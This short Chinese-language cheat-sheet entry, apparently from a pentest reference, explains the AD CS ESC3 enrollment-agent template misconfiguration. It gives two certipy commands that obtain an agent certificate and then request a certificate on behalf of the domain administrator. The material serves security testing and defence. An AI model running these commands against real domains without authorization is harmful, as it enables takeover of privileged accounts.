# Active Directory - 证书 ESC3

## ESC3 - 错误配置的注册代理模板

> ESC3 是指证书模板指定了证书请求代理 EKU（注册代理）的情况。此 EKU 可用于代表其他用户请求证书。

* 基于存在漏洞的证书模板 ESC3 请求证书。

  ```ps1
  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
  [*] Saved certificate and private key to 'john.pfx'
  ```

* 使用证书请求代理证书（-pfx）代表其他用户请求证书

  ```ps1
  certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
  ```

## 参考资料
